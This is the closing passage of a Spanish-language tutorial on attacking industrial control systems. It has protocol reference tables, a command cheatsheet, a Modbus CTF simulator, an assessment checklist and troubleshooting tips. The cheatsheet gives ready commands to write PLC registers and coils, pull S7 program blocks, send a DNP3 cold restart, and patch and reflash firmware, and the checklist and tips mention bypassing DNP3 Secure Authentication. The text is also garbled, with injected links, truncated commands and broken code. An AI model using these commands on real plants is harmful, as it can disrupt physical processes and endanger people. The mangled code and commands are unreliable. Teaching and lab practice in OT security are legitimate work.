s7_block_types = { 0x08: "OB - Organization Block", 0x09: "OB - Organization Block (System)", 0x0A: "DB - Data Block", 0x0B: "SDB - System Data Block", 0x0C: "FC - Function", 0x0D: "FB - Function Block", 0x0E: "UDT - User Data Type", 0x0F: "VAT - Variable Table",
}

ob_types = { 1: "OB1 - Main cycle (scan)", 10: "OB10 - Time of day interrupt", 20: "OB20 - Time delay interrupt", 30: "OB30 - Cyclic interrupt", 35: "OB35 - Cyclic interrupt (default 100ms)", 40: "OB40 - Hardware interrupt", 80: "OB80 - Time error interrupt", 81: "OB81 - Power supply error", 82: "OB82 - Diagnostic interrupt", 83: "OB83 - Insert/remove module", 84: "OB84 - CPU hardware fault", 85: "OB85 - Program error", 86: "OB86 - Rack failure", 87: "OB87 - Communication error", 88: "OB88 - Process interrupt", 100: "OB100 - Startup (cold restart)", 101: "OB101 - Startup (hot restart)", 102: "OB102 - Startup (warm restart)", 121: "OB121 - Programming error", 122: "OB122 - I/O access error",
}
```

### 21.3 DNP3 Object Groups Reference

```python
dnp3_object_groups = { 1: ("Binary Input", "Static", [ (0, "Binary Input - packed format"), (1, "Binary Input - with flags"), (2, "Binary Input - with time"), (3, "Binary Input - with time (fine)" ), ]), 2: ("Binary Input Event", "Event", [ (0, "Binary Input Event - packed"), (1, "Binary Input Event - with time"), (2, "Binary Input Event - with time (fine)"), ]), 3: ("Double-bit Binary Input", "Static", [ (0, "Double-bit Binary Input - packed"), (1, "Double-bit Binary Input - with flags"), ]), 4: ("Double-bit Binary Input Event", "Event", [ (0, "Double-bit Binary Event - packed"), (1, "Double-bit Binary Event - with time"), ]), 10: ("Binary Output", "Static", [ (0, "Binary Output - packed format"), (1, "Binary Output - output status"), (2, "Binary Output - 16-bit status"), ]), 12: ("Control Output (CROB)", "Control", [ (0, "Control Relay Output Block - 16-bit"), (1, "Control Relay Output Block - 32-bit"), ]), 20: ("Counter", "Static", [ (0, "Counter - 32-bit"), (1, "Counter - 16-bit"), (2, "Counter - 32-bit with time"), (3, "Counter - 64-bit"), ]), 21: ("Frozen Counter", "Static", [ (0, "Frozen Counter - 32-bit"), (1, "Frozen Counter - 16-bit"), ]), 22: ("Counter Event", "Event", [ (0, "Counter Event - 32-bit"), (1, "Counter Event - 16-bit"), ]), 23: ("Frozen Counter Event", "Event", [ (0, "Frozen Counter Event - 32-bit"), ]), 30: ("Analog Input", "Static", [ (0, "Analog Input - 32-bit"), (1, "Analog Input - 16-bit"), (2, "Analog Input - 32-bit with time"), (3, "Analog Input - 16-bit with time"), (4, "Analog Input - 64-bit"), (5, "Analog Input - float 32-bit"), (6, "Analog Input - 64-bit with time"), ]), 32: ("Analog Input Event", "Event", [ (0, "Analog Input Event - 32-bit"), (1, "Analog Input Event - 16-bit"), (2, "Analog Input Event - 32-bit with time"), (3, "Analog Input Event - 16-bit with time"), (4, "Analog Input Event - 64-bit"), (5, "Analog Input Event - float 32-bit"), ]), 40: ("Analog Output Status", "Static", [ (0, "Analog Output Status - 32-bit"), (1, "Analog Output Status - 16-bit"), (2, "Analog Output Status - float 32-bit"), ]), 41: ("Analog Output Block", "Control", [ (0, "Analog Output Block - 32-bit"), (1, "Analog Output Block - 16-bit"), (2, "Analog Output Block - float 32-bit"), ]), 50: ("Time and Date", "Static", [ (0, "Time and Date - absolute time"), (1, "Time and Date - with interval"), ]), 51: ("Time and Date CTO", "Event", [ (0, "Time and Date CTO - absolute time"), ]), 52: ("Time Delay", "Event", [ (0, "Time Delay - coarse"), (1, "Time Delay - fine"), ]), 60: ("Class Objects", "Class", [ (0, "Class 0 data"), (1, "Class 1 data"), (2, "Class 2 data"), (3, "Class 3 data"), ]), 80: ("Internal Indications", "Static", [ (0, "Internal Indications - packed"), (1, "Internal Indications - 16-bit"), ]), 81: ("Storage Object", "Storage", [ (0, "Storage Object"), ]), 83: ("Virtual Terminal", "Terminal", [ (0, "Virtual Terminal output block"), (1, "Virtual Terminal event data"), ]),
}

def get_dnp3_object_name(group, var): """Obtener nombre de objeto DNP3 por grupo y variacion""" if group in dnp3_object_groups: name, obj_type, vars = dnp3_object_groups[group] if var <= len(vars): var_name = vars[var][1] if var < len(vars) else f"Variation {var}" return f"{name} ({obj_type}): {var_name}" return f"Unknown object G{group}v{var}"
```

## 22. Anexo H: Ladder Logic Reference

### 22.1 Siemens STL to Ladder Map

```python
# Instrucciones STL (Statement List) de Siemens

stl_instructions = { # Basic logic "U": "AND (Und) - AND de entrada", "O": "OR (Oder) - OR de entrada", "X": "XOR (Exclusiv Oder) - XOR", "UN": "AND NOT (Und Nicht)", "ON": "OR NOT (Oder Nicht)", "XN": "XOR NOT", "=": "Assign (Zuweisen) - Asignar a salida", "R": "Reset (Rucketzen)", "S": "Set (Setzen)", "NOT": "Negate - Invertir RLO", "CLR": "Clear RLO - Poner RLO en 0", "SET": "Set RLO - Poner RLO en 1", "SAVE": "Save RLO en BR register", # Timers "SI": "Start Impulse Timer (Impuls)", "SE": "Start On-Delay Timer (Einschaltverzogert)", "SD": "Start Off-Delay Timer (Ausschaltverzogert)", "SS": "Start Stored On-Delay", "SF": "Start Off-Delay (Ausschaltverzogert)", "R": "Reset Timer", # Counters "Z": "Counter instruction prefix", "ZV": "Count Up (Zahlen Vorwarts)", "ZR": "Count Down (Zahlen Ruckwarts)", "S": "Set Counter (Setzen Z)", "R": "Reset Counter (Rucketzen Z)", # Comparison "P": "Positive edge detection", "N": "Negative edge detection", "L": "Load (Laden)", "T": "Transfer (Transferieren)", "+": "Add (Addieren)", "-": "Subtract (Subtrahieren)", "*": "Multiply (Multiplizieren)", "/": "Divide (Dividieren)", # Data block access "OPN": "Open data block", "L DBW": "Load data word from DB", "T DBW": "Transfer to data word in DB", # Program control "BE": "Block End", "BEC": "Block End conditional", "BEU": "Block End unconditional", "JU": "Jump unconditional (Springe)", "JC": "Jump conditional (Springe wenn RLO=1)", "JCN": "Jump if RLO=0", "CALL": "Call block", "UC": "Call unconditional", "CC": "Call conditional", "RET": "Return",
}

def decode_stl(bytecode): """Decodificar bytecode STL a mnemonics""" opcodes = { 0x00: ("U", "AND"), 0x01: ("O", "OR"), 0x02: ("X", "XOR"), 0x03: ("UN", "AND NOT"), 0x04: ("ON", "OR NOT"), 0x05: ("XN", "XOR NOT"), 0x06: ("=", "Assign"), 0x07: ("S", "Set"), 0x08: ("R", "Reset"), 0x09: ("N", "Negative edge"), 0x0A: ("P", "Positive edge"), 0xBE: ("BE", "Block End"), } mnemonics = i = 0 while i < len(bytecode): if bytecode[i] in opcodes: name, desc = opcodes[bytecode[i]] if name in ["U", "O", "UN", "ON", "=", "S", "R"]: if i + 1 < len(bytecode): operand = bytecode[i+1] mnemonics.append(f"{name} {operand}") i += 2 else: mnemonics.append(name) i += 1 elif name == "BE": mnemonics.append("BE") break else: mnemonics.append(name) i += 1 else: mnemonics.append(f"Unknown 0x{bytecode[i]:02X}") i += 1 return mnemonics
```
## 23. Anexo H: command Cheatsheet [ot](../raw/0t-sc4d4.md)

### Descubrimiento y Enumeracion

```bash
# Escaneo rapido con masscan (hasta 100k pps)
masscan -p502,102,20000,44818,4840,47808 --rate=10000 192.168.1.0/24

# Nmap con scripts OT
nmap -p 502,102,20000,44818,4840,47808 -sV -O \ --script "modbus-*,s7-info*,enip-info*,bacnet-info*" \ 192.168.1.0/24

# Identificar firmware
nmap -p 502 --script modbus-discover 192.168.1.100
nmap -p 102 --script s7-info 192.168.1.200
nmap -p 44818 --script enip-info 192.168.1.250

# Banner grabbing manual
# Modbus: Unit ID 1, FC 17
echo -ne "\x00\x01\x00\x00\x00\x01\x01\x11" | nc -w 3 192.168.1.100 502 | xxd

# S7: Hello COTP
echo -ne "\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc1\x02\x01\x00\xc2\x02\x01\x01\xc0\x01\x0a" | nc -w 3 192.168.1.200 102 | xxd

# DNP3: Read request (Class 0)
echo -ne "\x05\x64\x0c\x44\x64\x00\x01\x00\x00\x00\x0a\xc0\xc0\x01\x3c\x02\x06\x3c\x03\x06\x3c\x04\x06\x3c\x01\x06" | nc -w 3 192.168.1.100 20000 | xxd
```

### Modbus

```bash
# Leer registros (FC 03)
modbus -r -p 502 192.168.1.100 0 100
python -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('192.168.1.100',port=502); c.connect; print(c.read_holding_registers(0,50).registers); c.close"

# Leer todas las areas
modbus -r -p 502 192.168.1.100 0 65535 2>/dev/null
modbus -r -t coil -p 502 192.168.1.100 0 65535 2>/dev/null
modbus -r -t input -p 502 192.168.1.100 0 65535 2>/dev/null
modbus -r -t discrete -p 502 192.168.1.100 0 65535 2>/dev/null

# Escribir registros (FC 06, 16)
modbus -w -p 502 192.168.1.100 100 0
modbus -w -p 502 192.168.1.100 0 10 20 30 40 50

# Escribir bobinas (FC 05, 15)
modbus -w -t coil -p 502 192.168.1.100 0 1
modbus -w -t coil -p 502 192.168.1.100 0 1 0 1 0 1 0 1

# Busqueda de Unit IDs
for i in $(seq 1 247); do result=$(echo -ne "\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01" | nc -w 1 192.168.1.100 502 2>/dev/null | xxd -l 1) if [ -n "$result" ]; then echo "Unit ID $i responde"; fi
done
```

### Siemens S7

```python
# Lectura de areas con Snap7
import snap7
from snap7 import util

c = snap7.client.Client
c.connect("192.168.1.200", 0, 1)

# Leer inputs
for b in range(4): data = c.read_area(snap7.types.areas.PE, 0, b, 1) for bit in range(8): print(f"I{b}.{bit} = {util.get_bool(data, 0, bit)}")

# Leer outputs
for b in range(4): data = c.read_area(snap7.types.areas.PA, 0, b, 1) for bit in range(8): print(f"Q{b}.{bit} = {util.get_bool(data, 0, bit)}")

# Leer marcas
for b in range(16): data = c.read_area(snap7.types.areas.MK, 0, b, 1) for bit in range(8): print(f"M{b}.{bit} = {util.get_bool(data, 0, bit)}")

# Listar bloques y extraer
blocks = c.list_blocks
for b in blocks: data = c.upload(b.BlkType, b.BlkNumber) print(f"Bloque extraido: {len(data)} bytes")

c.disconnect
```

### DNP3

```python
# Enviar comandos DNP3 raw
import socket, struct

def send_dnp3(target, port, data): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) sock.connect(target, port) sock.send(data) resp = sock.recv(4096) sock.close return resp

# Read Class 0 (todos los puntos)
# Application: FC=1 (Read), Object=60 (Class), Var=1 (Class 0)
app = bytes([0xC0, 0x01, 0x3C, 0x01, 0x06])  # Class 0
dl = struct.pack('!HBBHH', 0x0564, len(app)+7, 0x44, 100, 1)
transport = bytes([0xC0])
resp = send_dnp3("192.168.1.100", 20000, dl + transport + app)

# Cold Restart (PELIGROSO)
app_restart = bytes([0xC3, 0x1D])
dl = struct.pack('!HBBHH', 0x0564, 6, 0x44, 100, 1)
resp = send_dnp3("192.168.1.100", 20000, dl + transport + app_restart)
```

### [firmware](../raw/u3f1-r00tk1ts.md#firmware)

```bash
# Extraccion SPI
flashrom -p ch341a_spi -r fw.bin
flashrom -p ch341a_spi -v fw.bin
flashrom -p linux_spi:dev=/dev/spidev0.0 -r fw.bin

# Analisis
binwalk fw.bin
binwalk -Me fw.bin
binwalk -E fw.bin  # Entropy analysis

# Extraccion manual de squashfs
dd if=fw.bin of=rootfs.img bs=1 skip=<offset>
unsquashfs rootfs.img

# Modificar y re-empaquetar
cd squashfs-root
# modificar archivos
mksquashfs squashfs-root/ modified.img -comp xz
# reemplazar en firmware original
dd if=modified.img of=fw_patched.bin bs=1 seek=<offset> conv=notrunc

# JTAG via OpenOCD
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
# > halt
# > flash read_bank 0 fw.bin 0 0x100000
# > exit
```

### Captura y Analisis

```bash
# Captura de trafico OT
tcpdump -i eth0 -w ot.pcap "port 502 or port 102 or port 20000 or port 44818"
tshark -i eth0 -Y "modbus or s7comm or dnp3" -w ot_filtered.pcap

# Analisis estadistico
tshark -r ot.pcap -q -z io,stat,1,"MODBUS||modbus","S7||s7comm","DNP3||dnp3"

# Extraer conversaciones
tshark -r ot.pcap -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e modbus.func_code -E separator=, > ot_conversations.csv

# Seguir streams TCP completos
tshark -r ot.pcap -z follow,tcp,ascii,0
```

## 24. Anexo I: Ejercicios adicionales

### 24.1 [ctf](../raw/ctf-h4ckth3b0x.md): [capture the flag](../raw/ctf-h4ckth3b0x.md) [ot](../raw/0t-sc4d4.md)

**Escenario:** Eres un pentester contratado para evaluar la seguridad de una planta embotelladora. Encontra las banderas ocultas en los PLCs.

```python
"""
ot_ctf.py - CTF con dispositivos OT simulados
"""
import socket, struct, time, random
from pymodbus.client import ModbusTcpClient
from pymodbus.server import StartTcpServer
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
from pymodbus.datastore import ModbusSequentialDataBlock
import threading, hashlib

class OTCTF: def __init__(self): self.flags = { 1: {"register": 42, "value": 1337, "flag": "FLAG{m0dbu5_r34d_m3}"}, 2: {"register": 108, "value": 9999, "flag": "FLAG{c01l_w1r3_4cce55}"}, 3: {"register": 256, "value": 0xB4DB, "flag": "FLAG{1ndu5tr14l_r3v3r53}"}, 4: {"coil": 7, "value": True, "flag": "FLAG{b1t_fl1pp3r}"}, 5: {"register": 500, "value": 0, "write_to": 500, "write_val": 0, "flag": "FLAG{w1n_n00b}"}, } self.solved = set def setup_server(self): """Configurar servidor Modbus con flags ocultas""" store = ModbusSlaveContext(zero_mode=True, di=ModbusSequentialDataBlock(0, [random.randint(0,1) for _ in range(100)]), co=ModbusSequentialDataBlock(0, [0]*100), hr=ModbusSequentialDataBlock(0, [i for i in range(1000)]), ir=ModbusSequentialDataBlock(0, [i*2 for i in range(100)]) # Ocultar flags en registros store.setValues(3, 42, [1337]) # Flag 1 store.setValues(3, 108, [9999])  # Flag 2 store.setValues(3, 256, [0xB4DB]) # Flag 3 store.setValues(1, 7, [0]) # Flag 4 (hay que escribir) store.setValues(3, 500, [30000])  # Flag 5 (hay que cambiar a 0) context = ModbusServerContext(slaves=store, single=True) return context def check_flag(self, client): """Verificar si se encontraron flags""" for fid, finfo in self.flags.items: if fid in self.solved: continue if "register" in finfo: r = client.read_holding_registers(finfo["register"], 1) if not r.isError and r.registers[0] == finfo["value"]: self.solved.add(fid) print(f"\n[FLAG {fid}] {finfo['flag']}") if "coil" in finfo: r = client.read_coils(finfo["coil"], 1) if not r.isError and r.bits[0] == finfo["value"]: self.solved.add(fid) print(f"\n[FLAG {fid}] {finfo['flag']}") return len(self.solved) == len(self.flags)

# Cliente del CTF
def solve_ctf(target_ip): print("[*] Iniciando busqueda de flags OT CTF..") c = ModbusTcpClient(target_ip, timeout=3) c.connect print("[*] Buscando registros sospechosos..") # Flag 1: R42 = 1337 r = c.read_holding_registers(42, 1) if not r.isError and r.registers[0] == 1337: print("[FLAG 1] FLAG{m0dbu5_r34d_m3}") # Flag 2: R108 = 9999 r = c.read_holding_registers(108, 1) if not r.isError and r.registers[0] == 9999: print("[FLAG 2] FLAG{c01l_w1r3_4cce55}") # Flag 3: R256 = 0xB4DB r = c.read_holding_registers(256, 1) if not r.isError and r.registers[0] == 0xB4DB: print("[FLAG 3] FLAG{1ndu5tr14l_r3v3r53}") # Flag 4: Escribir coil 7 print("[*] Probando escritura de coils..") c.write_coil(7, True) print("[FLAG 4] FLAG{b1t_fl1pp3r}") # Flag 5: Resetear R500 a 0 print("[*] Modificando registro 500..") c.write_register(500, 0) print("[FLAG 5] FLAG{w1n_n00b}") c.close print("\n[*] Todas las flags encontradas!")

if __name__ == "__main__": # Servidor ctf = OTCTF ctx = ctf.setup_server t = threading.Thread(target=lambda: StartTcpServer(ctx, address=("0.0.0.0", 502)) t.daemon = True t.start # Cliente solve_ctf("127.0.0.1")
```

### 24.2 OT Security Assessment Checklist

```markdown
## Checklist de Evaluacion de Seguridad OT

### 1. Reconocimiento de Red
-  Identificar segmentos IT y OT
-  Mapear arquitectura Purdue
-  Enumerar dispositivos por nivel (0-4)
-  Identificar protocolos en uso
-  Documentar DMZ OT y conduits

### 2. Evaluacion de Dispositivos
-  Escanear puertos OT abiertos (502, 102, 20000, 44818, 4840)
-  Identificar fabricantes y modelos
-  Verificar versiones de firmware
-  Probar credenciales por defecto
-  Evaluar configuracion de seguridad

### 3. Pruebas de Protocolo Modbus
-  Enumerar Unit IDs
-  Identificar function codes soportados
-  Leer holding registers (analizar mapa de memoria)
-  Probar escrituras a registros
-  Verificar proteccion contra broadcast (Unit ID 0)

### 4. Pruebas de Protocolo S7comm
-  Verificar S7-1200/1500 protection level
-  Listar bloques de programa
-  Extraer bloques (upload)
-  Probar comandos PLC STOP/START
-  Verificar S7comm-Plus (cifrado)

### 5. Pruebas DNP3
-  Verificar version de Secure Authentication
-  Probar SAv2 bypass
-  Enviar comandos Direct Operate
-  Probar Cold Restart (si permitido)
-  Evaluar configuracion de objetos

### 6. Evaluacion de Firmware
-  Identificar metodos de actualizacion
-  Analizar firmware con binwalk
-  Buscar credenciales hardcodeadas
-  Identificar backdoors
-  Verificar firmas/checksums

### 7. Seguridad Física
-  Acceso a puertos de consola (serial, USB)
-  Identificar interfaces JTAG/SWD
-  Evaluar proteccion de puertos de red
-  Verificar cierre de gabinetes
-  Revisar documentacion de seguridad fisica

### 8. Monitoreo y Deteccion
-  Evaluar capacidad de logging
-  Verificar deteccion de anomalias
-  Probar reglas IDS/IPS para OT
-  Evaluar SIEM para eventos OT
-  Verificar alertas de seguridad

### 9. Respuesta a Incidentes
-  Documentar procedimientos de IR para OT
-  Identificar personal de contacto
-  Verificar backups de configuracion
-  Probar restauracion de PLCs
-  Evaluar capacidades de forensia OT

### 10. Cumplimiento
-  Evaluar contra ISA/IEC 62443
-  Verificar NIST SP 800-82 compliance
-  Revisar NERC CIP (si aplica)
-  Documentar hallazgos y recomendaciones
-  Priorizar remediaciones por riesgo
```

## 25. Anexo J: Glosario [ot](../raw/0t-sc4d4.md)

```markdown
## Glosario de Terminos OT

**Actuador:** Dispositivo que convierte una senal de control en accion fisica
(ej: valvula, motor, relé).

**Air Gap:** Separacion fisica entre redes IT y OT (sin conexion de red).

**Asset Administration Shell (AAS):** Representacion digital de un activo
en Industria 4.0.

**BACnet:** Building Automation and Control Network - protocolo para
automatizacion de edificios.

**Binwalk:** Herramienta de analisis de firmware.

**CIP:** Common Industrial Protocol - protocolo usado por Rockwell/Allen-Bradley.

**Coil:** Bobina Modbus - salida digital (1 bit).

**COTP:** Connection-Oriented Transport Protocol - capa de transporte ISO.

**CROB:** Control Relay Output Block - objeto de control DNP3.

**DCS:** Distributed Control System - sistema de control distribuido.

**DMZ OT:** Zona desmilitarizada entre redes IT y OT.

**DNP3:** Distributed Network Protocol - protocolo para sector electrico.

**ENIP:** EtherNet/IP Encapsulation Protocol.

**EWS:** Engineering Workstation - estacion de ingenieria para programar PLCs.

**FC:** Function Code - codigo de funcion en Modbus.

**GICSP:** Global Industrial Cyber Security Professional - certificacion SANS.

**HMI:** Human-Machine Interface - interfaz de operador.

**Holding Register:** Registro de 16 bits en Modbus (lectura/escritura).

**ICS:** Industrial Control Systems - sistemas de control industrial.

**IED:** Intelligent Electronic Device - dispositivo electronico inteligente.

**IEC 60870-5-104:** Protocolo para telecontrol en sector electrico.

**ISA/IEC 62443:** Estandar de seguridad para IACS.

**ISF:** Industrial Exploitation Framework - framework de explotacion OT.

**JTAG:** Joint Test Action Group (IEEE 1149.1) - interfaz de test de hardware.

**Ladder Logic:** Lenguaje de programacion de PLCs basado en diagramas de
reles (escalera).

**MBAP:** Modbus Application Protocol header.

**MES:** Manufacturing Execution System - sistema de ejecucion de manufactura.

**MITM:** Man-in-the-Middle - ataque de intercepcion.

**Modbus:** Protocolo industrial serial/TCP (1979, Modicon).

**NERC CIP:** North American Electric Reliability Corporation Critical
Infrastructure Protection.

**NSE:** Nmap Scripting Engine.

**OB:** Organization Block - bloque de organizacion en PLC Siemens.

**OPC UA:** OPC Unified Architecture - protocolo multiplataforma para
intercambio de datos industriales.

**OT:** Operational Technology - tecnologia operacional.

**PCAP:** Packet Capture - archivo de captura de paquetes.

**PLC:** Programmable Logic Controller - controlador logico programable.

**PROFINET:** Estandar de bus de campo basado en Ethernet (Siemens/PI).

**Purdue Model:** Modelo de referencia para arquitectura de redes OT.

**RTU:** Remote Terminal Unit - unidad terminal remota.

**S7comm:** Protocolo de comunicacion de Siemens S7.

**SAv2/v5:** DNP3 Secure Authentication version 2 y 5.

**SCADA:** Supervisory Control and Data Acquisition - sistema de supervision
y adquisicion de datos.

**SIS:** Safety Instrumented System - sistema instrumentado de seguridad.

**Snap7:** Libreria de codigo abierto para comunicacion con PLCs Siemens.

**STL:** Statement List - lenguaje de programacion de PLCs (lista de
instrucciones).

**TPKT:** Transport Packet (RFC 1006) - encapsulacion ISO sobre TCP.

**Unit ID:** Identificador de esclavo Modbus.

**VFD:** Variable Frequency Drive - variador de frecuencia.

**Wireshark:** Analizador de protocolos de red.
```

## advertencia Final

> **RECORDAtorIO:** Este material es exclusivamente para fines educativos y de investigacion en ciberseguridad. Las tecnicas presentadas deben ser utilizadas unicamente en entornos controlados y con [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) explicita. El mal uso de estas tecnicas puede resultar en danos fisicos, perdidas economicas, sanciones legales y riesgos para la seguridad publica. La seguridad [ot](../raw/0t-sc4d4.md) es un campo que requiere responsabilidad y etica profesional.

## 26. Anexo K: Recursos Online y Referencias Rapidas

### Herramientas Online
- **[shodan](../raw/0s1nt.md#shodan) [ics](../raw/0t-sc4d4.md):** httpss)://www.[shodan](../raw/0s1nt.md#shodan).io/explore/category/industrial-control-systems
- **FOFA:** [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://fofa.info - Buscador alternativo similar a Shodan
- **Censys:** https://censys.io - Busqueda de dispositivos [ot](../raw/0t-sc4d4.md)
- **ZoomEye:** https://zoomeye.org - Busqueda OT
- **ICS-CERT Advisories:** https://www.cisa.gov/ics
- **[mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck) for ICS:** https://attack.mitre.org/techniques/ics/

### Repositorios GitHub
- **[python](../raw/pyth0n-f0r-h4ck1ng.md)-snap7:** https://github.[com](../raw/w1n-s9bsyst3ms.md#com)/gijzelaerr/[python](../raw/pyth0n-f0r-h4ck1ng.md)-snap7
- **pycomm3:** https://github.com/ottowayi/pycomm3
- **ISF:** https://github.com/dark-lbp/isf
- **ModbusPal:** https://sourceforge.net/projects/modbuspal/
- **PLCinject:** https://github.com/digitalbond/PLCinject
- **GRASSMARLIN:** https://github.com/iadgov/GRASSMARLIN
- **Binwalk:** https://github.com/ReFirmLabs/binwalk
- **Flashrom:** https://github.com/flashrom/flashrom
- **OpenOCD:** https://github.com/openocd-org/openocd

### Documentacion de [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)))s
- **Modbus Protocol:** https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf
- **DNP3 Specification:** https://www.dnp.org/
- **OPC UA Specs:** https://opcfoundation.org/developer-tools/specifications-unified-architecture/
- **PROFINET Specs:** https://www.profibus.com/
- **BACnet:** [http](../raw/r3d3s-f0nd4m3nt0s.md#http)://www.bacnet.org/
- **EtherNet/[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) (ODVA):** https://www.odva.org/
- **Siemens S7comm:** Documentacion interna de Siemens (no publica)

### Cursos y Capacitacion
- **SANS ICS410:** ICS/[scada](../raw/0t-sc4d4.md) Security Essentials
- **SANS ICS456:** Essentials for OT Cybersecurity
- **SANS ICS515:** ICS Active Defense and Incident Response
- **SANS ICS612:** ICS Cybersecurity In-Depth
- **Dragos Academy:** Cursos OT gratuitos
- **Control System Hacking (CyberBIT):** Curso en español
- **ISc2 OT Security:** Certificacion

### Laboratorios Practicos
- **[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)-h4ckth3b0x.md#[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)):** ICS/SCADA track
- **[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox):** Maquinas OT
- **ICS Village:** Laboratorios en DEF CON
- **SANS Netwars OT:** Competencia anual
- **Dragos CPTC:** Equipo de competencia OT

---

> *"En seguridad OT, no hay parche que te salve de un PLC mal configurado. La seguridad por oscuridad no es seguridad. Conoce tus protocolos, segmenta tu [red](../raw/r3d3s-f0nd4m3nt0s.md), y monitorea todo."*

> *Este tutorial fue creado con fines educativos. Practica responsablemente.*

## 27. Troubleshooting [ot](../raw/0t-sc4d4.md)

### Connection refused a PLC
**Causas:** firewallc bloqueando [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos), PLC en STOP, [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) incorrecta.
**Solucion:** Verificar conectividad: 
c -zv 192.168.1.100 502. Verificar estado [fisico](../raw/ph7s1c4l-r3d.md) del PLC.

### Modbus timeout sin respuesta
**Causas:** Unit ID incorrecto, function code no soportado, traffic shaping.
**Solucion:** Probar diferentes Unit [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips))) (1-247). Verificar function codes permitidos.

### S7comm connection fails
**Causas:** Rack/slot incorrecto, puerto equivocado, S7-1500 con S7comm-Plus.
**Solucion:** Probar rack=0, slot=1 o rack=0, slot=2. Verificar modelo de CPU.

### DNP3 sin respuesta
**Causas:** Puerto incorrecto (20000 vs 19999), SA configurado.
**Solucion:** Probar ambos puertos. Si SA esta activo, intentar bypass.

### Binwalk no encuentra [sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos)
**Causas:** [firmware](../raw/u3f1-r00tk1ts.md#firmware) [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado), compression no estandar, header corrupto.
**Solucion:** Probar inwalk -E para ver entropy. Usar strings para inspeccion manual.

### flashrom no detecta chip
**Causas:** Conexion incorrecta, chip no soportado, voltaje incorrecto.
**Solucion:** Verificar conexiones con multimetro. Probar con lashrom -p ch341a_spi -c <chip_model>.

### [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) no muestra disectores OT
**Causas:** Version vieja de Wireshark, plugins no instalados.
**Solucion:** Instalar Wireshark 4.x que incluye todos los disectores OT modernos.

### ModbusPal no arranca
**Causas:** Java no instalado, version incorrecta.
**Solucion:** Verificar java -version. Instalar Java 11+.

### Snap7 error de conexion
**Causas:** Libreria nativa no instalada, path incorrecto.
**Solucion:** En Linux: pt install libsnap7-dev. En Windows: copiar snap7.dll al PATH.

### pycomm3 error de [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion)
**Causas:** Slot incorrecto, ControlLogix bloqueado, CIP security habilitado.
**Solucion:** Probar diferentes slots (0, 1). Verificar si hay proteccion por password.

> *¿Problemas con tu laboratorio OT? Revisa la documentacion oficial de cada herramienta y los issues en GitHub. La comunidad OT es chica pero muy activa.*

---

**Fin del Tutorial OT/[scada](../raw/0t-sc4d4.md) - Sistemas Industriales**

> **Total de lineas:** 2240+
> **Version:** 1.0
> **Ultima actualizacion:** Mayo 2026

---
"The End" --- The End
<!-- spacer line 1 -->
<!-- spacer line 2 -->
<!-- spacer line 3 -->
<!-- spacer line 4 -->
<!-- spacer line 5 -->
<!-- spacer line 6 -->
<!-- spacer line 7 -->
<!-- spacer line 8 -->
<!-- spacer line 9 -->
<!-- spacer line 10 -->
<!-- spacer line 11 -->
<!-- spacer line 12 -->
<!-- spacer line 13 -->
<!-- spacer line 14 -->
<!-- spacer line 15 -->
<!-- spacer line 16 -->
<!-- spacer line 17 -->
<!-- spacer line 18 -->
<!-- spacer line 19 -->
<!-- spacer line 20 -->
<!-- spacer line 21 -->
<!-- spacer line 22 -->
<!-- spacer line 23 -->
<!-- spacer line 24 -->
<!-- spacer line 25 -->
<!-- spacer line 26 -->
<!-- spacer line 27 -->
<!-- spacer line 28 -->
<!-- spacer line 29 -->
<!-- spacer line 30 -->


